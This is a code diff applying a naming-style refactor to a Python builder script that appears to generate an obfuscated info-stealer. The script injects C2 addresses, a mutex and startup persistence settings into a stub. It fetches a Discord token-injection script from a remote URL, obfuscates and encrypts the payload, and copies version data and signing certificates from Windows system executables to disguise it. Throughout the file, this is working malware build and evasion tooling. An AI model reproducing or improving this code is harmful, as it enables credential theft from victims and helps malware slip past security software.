@@ -8,8 +8,8 @@ import py_compile
 import zlib
 import pyaes
 import zipfile
-
 from urllib3 import PoolManager, disable_warnings
+
 disable_warnings()
 import BlankOBF as obfuscator
 from sigthief import outputCert
@@ -19,11 +19,11 @@ InCodeFile = "stub.py"
 OutCodeFile = "stub-o.py"
 InjectionURL = "https://raw.githubusercontent.com/f4kedre4lity/Discord-Injection-BG/main/injection-obfuscated.js"
 
-def WriteSettings(code: str, settings: dict, injection: str) -> str:
+def write_settings(code: str, settings: dict, injection: str) -> str:
     code = code.replace('__name__ == "__main__" and ', '')
-    code = code.replace('"%c2%"', "(%d, %s)" % (settings["settings"]["c2"][0], EncryptString(settings["settings"]["c2"][1])))
-    code = code.replace('"%mutex%"', EncryptString(settings["settings"]["mutex"]))
-    code = code.replace('"%archivepassword%"', EncryptString(settings["settings"]["archivePassword"]))
+    code = code.replace('"%c2%"', "(%d, %s)" % (settings["settings"]["c2"][0], encrypt_string(settings["settings"]["c2"][1])))
+    code = code.replace('"%mutex%"', encrypt_string(settings["settings"]["mutex"]))
+    code = code.replace('"%archivepassword%"', encrypt_string(settings["settings"]["archivePassword"]))
     code = code.replace('%pingme%', "true" if settings["settings"]["pingme"] else "")
     code = code.replace('%vmprotect%', "true" if settings["settings"]["vmprotect"] else "")
     code = code.replace('%startup%', "true" if settings["settings"]["startup"] else "")
@@ -60,7 +60,7 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
     
     return code
 
-def PrepareEnvironment(settings: dict) -> None:
+def prepare_environment(settings: dict) -> None:
     if os.path.isfile("bound.exe"):
         with open("bound.exe", "rb") as file:
             content = file.read()
@@ -79,15 +79,14 @@ def PrepareEnvironment(settings: dict) -> None:
         if os.path.isfile("noconsole"):
             os.remove("noconsole")
     
-    pumpedStubSize = settings["settings"]["pumpedStubSize"]
-    if pumpedStubSize > 0:
+    pumped_stub_size = settings["settings"]["pumpedStubSize"]
+    if pumped_stub_size > 0:
         with open("pumpStub", "w") as file:
-            file.write(str(pumpedStubSize))
+            file.write(str(pumped_stub_size))
     elif os.path.isfile("pumpStub"):
         os.remove("pumpStub")
 
-def ReadSettings() -> tuple[dict, str]:
-
+def read_settings() -> tuple[dict, str]:
     settings, injection = dict(), str()
     if os.path.isfile(SettingsFile):
         with open(SettingsFile) as file:
@@ -103,8 +102,8 @@ def ReadSettings() -> tuple[dict, str]:
     
     return (settings, injection)
 
-def EncryptString(plainText: str) -> str:
-    encoded = base64.b64encode(plainText.encode()).decode()
+def encrypt_string(plain_text: str) -> str:
+    encoded = base64.b64encode(plain_text.encode()).decode()
     return "base64.b64decode(\"{}\").decode()".format(encoded)
 
 def junk(path: str) -> None:
@@ -129,10 +128,10 @@ class %s:
     with open(path, "w") as file:
         file.write(code + "\n" + junk_code)
 
-def MakeVersionFileAndCert() -> None:
+def make_version_file_and_cert() -> None:
     original: str
     retries = 0
-    exeFiles = []
+    exe_files = []
     paths = [
         os.getenv("SystemRoot"),
         os.path.join(os.getenv("SystemRoot"), "System32"),
@@ -144,11 +143,11 @@ def MakeVersionFileAndCert() -> None:
 
     for path in paths:
         if os.path.isdir(path):
-            exeFiles += [os.path.join(path, x) for x in os.listdir(path) if (x.endswith(".exe") and not x in exeFiles)]
+            exe_files += [os.path.join(path, x) for x in os.listdir(path) if (x.endswith(".exe") and not x in exe_files)]
 
-    if exeFiles:
+    if exe_files:
         while(retries < 5):
-            exefile = random.choice(exeFiles)
+            exefile = random.choice(exe_files)
             res = subprocess.run('pyi-grab_version "{}" version.txt'.format(exefile), shell= True, capture_output= True)
             if res.returncode != 0:
                 retries += 1
@@ -170,26 +169,26 @@ def main() -> None:
     with open(InCodeFile) as file:
         code = file.read()
 
-    code = WriteSettings(code, *ReadSettings())
-    PrepareEnvironment(ReadSettings()[0])
+    code = write_settings(code, *read_settings())
+    prepare_environment(read_settings()[0])
 
     obfuscator.BlankOBF(code, OutCodeFile)
     junk(OutCodeFile)
 
-    compiledFile = "stub-o.pyc"
-    zipFile = "blank.aes"
-    py_compile.compile(OutCodeFile, compiledFile)
+    compiled_file = "stub-o.pyc"
+    zip_file = "blank.aes"
+    py_compile.compile(OutCodeFile, compiled_file)
     os.remove(OutCodeFile)
-    with zipfile.ZipFile(zipFile, "w") as zip:
-        zip.write(compiledFile)
-    os.remove(compiledFile)
+    with zipfile.ZipFile(zip_file, "w") as zip:
+        zip.write(compiled_file)
+    os.remove(compiled_file)
 
     key = os.urandom(32)
     iv = os.urandom(12)
 
-    encrypted = pyaes.AESModeOfOperationGCM(key, iv).encrypt(open(zipFile, "rb").read())
+    encrypted = pyaes.AESModeOfOperationGCM(key, iv).encrypt(open(zip_file, "rb").read())
     encrypted = zlib.compress(encrypted)[::-1]
-    open(zipFile, "wb").write(encrypted)
+    open(zip_file, "wb").write(encrypted)
     
     with open("loader.py", "r") as file:
         loader = file.read()
@@ -200,7 +199,7 @@ def main() -> None:
     with open("loader-o.py", "w") as file:
         file.write(loader)
 
-    MakeVersionFileAndCert()
+    make_version_file_and_cert()
 
 if __name__ == "__main__":
     main()
